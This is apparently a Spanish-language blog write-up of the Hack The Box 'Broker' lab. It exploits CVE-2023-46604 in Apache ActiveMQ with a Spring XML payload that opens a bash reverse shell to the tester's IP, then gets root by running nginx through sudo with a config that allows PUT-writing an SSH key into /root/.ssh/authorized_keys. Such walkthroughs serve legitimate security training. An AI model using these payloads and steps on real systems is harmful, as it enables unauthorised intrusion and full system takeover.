---
title: Broker - WriteUp
date: 'Sun, 09 Jun 2024 00:00:00 GMT'
categories:
  - WriteUps
  - HTB
  - Linux
tags:
  - ctf
  - nmap
  - htb
  - cve
  - exploit
  - nginx
  - apache
  - cve-2023-46604
  - linux
  - ssh
image: /assets/img/cabeceras/2024-06-09-BROKER-WRITEUP.png
description: >-
  Broker es una máquina Linux de dificultad fácil que aloja una versión de
  Apache ActiveMQ. La enumeración de la versión de Apache ActiveMQ muestra que
  es vulnerable a la ejecución remota de código no autenticado, que se utiliza
  para obtener acceso de usuario al objetivo. La enumeración posterior a la
  explotación revela que el sistema tiene una configuración incorrecta de sudo
  que permite al usuario activemq ejecutar sudo /usr/sbin/nginx, similar a la
  reciente divulgación de Zimbra y que se utiliza para obtener acceso root.
---

{% include machine-info.html
  machine="Broker"
  os="Linux"
  difficulty="Easy"
  platform="HTB"
%}


## Reconocimiento

NMAP

```bash
# Nmap 7.94SVN scan initiated Wed Nov 29 08:50:44 2023 as: nmap -sCV -p 22,80,1883,5672,8161,33323,61613,61614,61616 --stylesheet=https://raw.githubusercontent.com/honze-net/nmap-bootstrap-xsl/stable/nmap-bootstrap.xsl -oN targeted -oX targetedXML 10.129.58.23
Nmap scan report for 10.129.58.23
Host is up (0.11s latency).

PORT      STATE SERVICE    VERSION
22/tcp    open  ssh        OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)
|_  256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)
80/tcp    open  http       nginx 1.18.0 (Ubuntu)
|_http-title: Error 401 Unauthorized
|_http-server-header: nginx/1.18.0 (Ubuntu)
| http-auth: 
| HTTP/1.1 401 Unauthorized\x0D
|_  basic realm=ActiveMQRealm
1883/tcp  open  mqtt
| mqtt-subscribe: 
|   Topics and their most recent payloads: 
|     ActiveMQ/Advisory/Consumer/Topic/#: 
|_    ActiveMQ/Advisory/MasterBroker: 
5672/tcp  open  amqp?
| fingerprint-strings: 
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, GetRequest, HTTPOptions, RPCCheck, RTSPRequest, SSLSessionReq, TerminalServerCookie: 
|     AMQP
|     AMQP
|     amqp:decode-error
|_    7Connection from client using unsupported AMQP attempted
|_amqp-info: ERROR: AQMP:handshake expected header (1) frame, but was 65
8161/tcp  open  http       Jetty 9.4.39.v20210325
|_http-server-header: Jetty(9.4.39.v20210325)
|_http-title: Error 401 Unauthorized
| http-auth: 
| HTTP/1.1 401 Unauthorized\x0D
|_  basic realm=ActiveMQRealm
33323/tcp open  tcpwrapped
61613/tcp open  stomp      Apache ActiveMQ
| fingerprint-strings: 
|   HELP4STOMP: 
|     ERROR
|     content-type:text/plain
|     message:Unknown STOMP action: HELP
|     org.apache.activemq.transport.stomp.ProtocolException: Unknown STOMP action: HELP
|     org.apache.activemq.transport.stomp.ProtocolConverter.onStompCommand(ProtocolConverter.java:258)
|     org.apache.activemq.transport.stomp.StompTransportFilter.onCommand(StompTransportFilter.java:85)
|     org.apache.activemq.transport.TransportSupport.doConsume(TransportSupport.java:83)
|     org.apache.activemq.transport.tcp.TcpTransport.doRun(TcpTransport.java:233)
|     org.apache.activemq.transport.tcp.TcpTransport.run(TcpTransport.java:215)
|_    java.lang.Thread.run(Thread.java:750)
61614/tcp open  http       Jetty 9.4.39.v20210325
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Jetty(9.4.39.v20210325)
|_http-title: Site doesn't have a title.
61616/tcp open  apachemq   ActiveMQ OpenWire transport
| fingerprint-strings: 
|   NULL: 
|     ActiveMQ
|     TcpNoDelayEnabled
|     SizePrefixDisabled
|     CacheSize
|     ProviderName 
|     ActiveMQ
|     StackTraceEnabled
|     PlatformDetails 
|     Java
|     CacheEnabled
|     TightEncodingEnabled
|     MaxFrameSize
|     MaxInactivityDuration
|     MaxInactivityDurationInitalDelay
|     ProviderVersion 
|_    5.15.15
3 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port5672-TCP:V=7.94SVN%I=7%D=11/29%Time=6566ED61%P=x86_64-pc-linux-gnu%
SF:r(GetRequest,89,"AMQP\x03\x01\0\0AMQP\0\x01\0\0\0\0\0\x19\x02\0\0\0\0S\
SF:x10\xc0\x0c\x04\xa1\0@p\0\x02\0\0`\x7f\xff\0\0\0`\x02\0\0\0\0S\x18\xc0S
SF:\x01\0S\x1d\xc0M\x02\xa3\x11amqp:decode-error\xa17Connection\x20from\x2
SF:0client\x20using\x20unsupported\x20AMQP\x20attempted")%r(HTTPOptions,89
SF:,"AMQP\x03\x01\0\0AMQP\0\x01\0\0\0\0\0\x19\x02\0\0\0\0S\x10\xc0\x0c\x04
SF:\xa1\0@p\0\x02\0\0`\x7f\xff\0\0\0`\x02\0\0\0\0S\x18\xc0S\x01\0S\x1d\xc0
SF:M\x02\xa3\x11amqp:decode-error\xa17Connection\x20from\x20client\x20usin
SF:g\x20unsupported\x20AMQP\x20attempted")%r(RTSPRequest,89,"AMQP\x03\x01\
SF:0\0AMQP\0\x01\0\0\0\0\0\x19\x02\0\0\0\0S\x10\xc0\x0c\x04\xa1\0@p\0\x02\
SF:0\0`\x7f\xff\0\0\0`\x02\0\0\0\0S\x18\xc0S\x01\0S\x1d\xc0M\x02\xa3\x11am
SF:qp:decode-error\xa17Connection\x20from\x20client\x20using\x20unsupporte
SF:d\x20AMQP\x20attempted")%r(RPCCheck,89,"AMQP\x03\x01\0\0AMQP\0\x01\0\0\
SF:0\0\0\x19\x02\0\0\0\0S\x10\xc0\x0c\x04\xa1\0@p\0\x02\0\0`\x7f\xff\0\0\0
SF:`\x02\0\0\0\0S\x18\xc0S\x01\0S\x1d\xc0M\x02\xa3\x11amqp:decode-error\xa
SF:17Connection\x20from\x20client\x20using\x20unsupported\x20AMQP\x20attem
SF:pted")%r(DNSVersionBindReqTCP,89,"AMQP\x03\x01\0\0AMQP\0\x01\0\0\0\0\0\
SF:x19\x02\0\0\0\0S\x10\xc0\x0c\x04\xa1\0@p\0\x02\0\0`\x7f\xff\0\0\0`\x02\
SF:0\0\0\0S\x18\xc0S\x01\0S\x1d\xc0M\x02\xa3\x11amqp:decode-error\xa17Conn
SF:ection\x20from\x20client\x20using\x20unsupported\x20AMQP\x20attempted")
SF:%r(DNSStatusRequestTCP,89,"AMQP\x03\x01\0\0AMQP\0\x01\0\0\0\0\0\x19\x02
SF:\0\0\0\0S\x10\xc0\x0c\x04\xa1\0@p\0\x02\0\0`\x7f\xff\0\0\0`\x02\0\0\0\0
SF:S\x18\xc0S\x01\0S\x1d\xc0M\x02\xa3\x11amqp:decode-error\xa17Connection\
SF:x20from\x20client\x20using\x20unsupported\x20AMQP\x20attempted")%r(SSLS
SF:essionReq,89,"AMQP\x03\x01\0\0AMQP\0\x01\0\0\0\0\0\x19\x02\0\0\0\0S\x10
SF:\xc0\x0c\x04\xa1\0@p\0\x02\0\0`\x7f\xff\0\0\0`\x02\0\0\0\0S\x18\xc0S\x0
SF:1\0S\x1d\xc0M\x02\xa3\x11amqp:decode-error\xa17Connection\x20from\x20cl
SF:ient\x20using\x20unsupported\x20AMQP\x20attempted")%r(TerminalServerCoo
SF:kie,89,"AMQP\x03\x01\0\0AMQP\0\x01\0\0\0\0\0\x19\x02\0\0\0\0S\x10\xc0\x
SF:0c\x04\xa1\0@p\0\x02\0\0`\x7f\xff\0\0\0`\x02\0\0\0\0S\x18\xc0S\x01\0S\x
SF:1d\xc0M\x02\xa3\x11amqp:decode-error\xa17Connection\x20from\x20client\x
SF:20using\x20unsupported\x20AMQP\x20attempted");
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port61613-TCP:V=7.94SVN%I=7%D=11/29%Time=6566ED5B%P=x86_64-pc-linux-gnu
SF:%r(HELP4STOMP,27F,"ERROR\ncontent-type:text/plain\nmessage:Unknown\x20S
SF:TOMP\x20action:\x20HELP\n\norg\.apache\.activemq\.transport\.stomp\.Pro
SF:tocolException:\x20Unknown\x20STOMP\x20action:\x20HELP\n\tat\x20org\.ap
SF:ache\.activemq\.transport\.stomp\.ProtocolConverter\.onStompCommand\(Pr
SF:otocolConverter\.java:258\)\n\tat\x20org\.apache\.activemq\.transport\.
SF:stomp\.StompTransportFilter\.onCommand\(StompTransportFilter\.java:85\)
SF:\n\tat\x20org\.apache\.activemq\.transport\.TransportSupport\.doConsume
SF:\(TransportSupport\.java:83\)\n\tat\x20org\.apache\.activemq\.transport
SF:\.tcp\.TcpTransport\.doRun\(TcpTransport\.java:233\)\n\tat\x20org\.apac
SF:he\.activemq\.transport\.tcp\.TcpTransport\.run\(TcpTransport\.java:215
SF:\)\n\tat\x20java\.lang\.Thread\.run\(Thread\.java:750\)\n\0\n");
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port61616-TCP:V=7.94SVN%I=7%D=11/29%Time=6566ED5B%P=x86_64-pc-linux-gnu
SF:%r(NULL,140,"\0\0\x01<\x01ActiveMQ\0\0\0\x0c\x01\0\0\x01\*\0\0\0\x0c\0\
SF:x11TcpNoDelayEnabled\x01\x01\0\x12SizePrefixDisabled\x01\0\0\tCacheSize
SF:\x05\0\0\x04\0\0\x0cProviderName\t\0\x08ActiveMQ\0\x11StackTraceEnabled
SF:\x01\x01\0\x0fPlatformDetails\t\0\x04Java\0\x0cCacheEnabled\x01\x01\0\x
SF:14TightEncodingEnabled\x01\x01\0\x0cMaxFrameSize\x06\0\0\0\0\x06@\0\0\0
SF:\x15MaxInactivityDuration\x06\0\0\0\0\0\0u0\0\x20MaxInactivityDurationI
SF:nitalDelay\x06\0\0\0\0\0\0'\x10\0\x0fProviderVersion\t\0\x075\.15\.15");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

HTTP 80

![BROKER](/assets/img/htb-writeups/Pasted-image-20231129085444.png)

Servicio ActiveMQ vulnerable a CVE-2023-46604
Buscamos información y encontramos un PoC. https://github.com/evkl1d/CVE-2023-46604

El exploit consta de 2 archivos, el exploit en si y un XML que se inyectará para ejecutar su contenido.

Editamos el archivo XML para adaptarlo a nuestras necesidades. Modificamos la IP y el puerto por la de nuestra máquina quedando así:

```XML
<?xml version="1.0" encoding="UTF-8" ?>
    <beans xmlns="http://www.springframework.org/schema/beans"
       xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
       xsi:schemaLocation="
     http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd">
        <bean id="pb" class="java.lang.ProcessBuilder" init-method="start">
            <constructor-arg>
            <list>
                <value>bash</value>
                <value>-c</value>
                <value>bash -i &gt;&amp; /dev/tcp/10.10.16.25/9001 0&gt;&amp;1</value>
            </list>
            </constructor-arg>
        </bean>
    </beans>
```

Nos ponemos a la escucha con _NetCat_ por el puerto 9001 que viene por defecto en el XML.

```bash
nc -nlvp 9001
```

En otra terminal levantamos un Web Server con _Python_ que servirá el archivo XML.

Y en otra terminal ejecutaremos todo el exploit atacando al puerto 61616 que es el puerto por defecto de este servicio.

```bash
$ python3 exploit.py -i 10.129.58.23 -p 61616 -u http://10.10.16.25/poc.xml
```

![BROKER](/assets/img/htb-writeups/Pasted-image-20231129091412.png)


## Explotación

Estamos dentro...
Registramos bandera de usuario y seguimos...

Hacemos un "sudo -l" y nos reponde lo siguiente.

![BROKER](/assets/img/htb-writeups/Pasted-image-20231129093901.png)

Podemos ejecutar _nginx_ como root.

Buscamos información al respecto en internet y encontramos un vector de ataque.

Vamos a proporcionarle a _nginx_ un archivo de configuración de un nuevo servicio web que levantará como root escuchando en un puerto que le indicaremos en este archivo. En el archivo de configuración le especificaremos también que podremos utilizar el método PUT que emplearemos para subir un archivo de clave pública (el nuestro) y lo meteremos dentro de /root/.ssh/authorized_keys. Una vez hecho esto nos podremos conectar con nuestra clave privada a la cuenta de root y así obtener la bandera.

El archivo de configuración descrito arriba será el siguiente:

```
user root;
worker_processes 4;
pid /tmp/nginx.pid;events {
	worker_connections 50;
}

http {
	server {
		listen 81;
		root /;
		autoindex on;
		dav_methods PUT;
	}
}
```

Lo guardamos como _nginx.conf_ en /tmp. y ejecutamos el comando en la máquina víctima:

```bash
activemq@broker:/tmp$ sudo /usr/sbin/nginx -c /tmp/nginx.conf
```

Verificamos que la máquina víctima está escuchando por el puerto 81 con el nuevo servicio que hemos creado:

```bash
ss -tunl
```

![BROKER](/assets/img/htb-writeups/Pasted-image-20231129101919.png)


## Escalada

Ahora generamos un par de claves con el comando "_ssh-keygen -t rsa -f root_" o usaremos una clave publica que tengamos generada y la copiaremos en un archivo llamado _root.pub_ dentro de /tmp

Ejecutamos un PUT con _curl_  para subir nuestra clave pública desde la máquina víctima.

```bash
activemq@broker:/tmp$ curl -X PUT localhost:81/root/.ssh/authorized_keys -d "$(cat root.pub)"
```

Desde nuestro equipo ejecutaremos una conexión SSH hacia la máquina victima con nuestra clave privada al usuario root.

```bash
$ ssh -i ~/.ssh/id_rsa root@10.129.58.23
```

Y pa dentro...

![BROKER](/assets/img/htb-writeups/Pasted-image-20231129105512.png)
---

**Última actualización**: 2024-06-09<br>
**Autor**: A. Lorente<br>
**Licencia**: Creative Commons BY-NC-SA 4.0
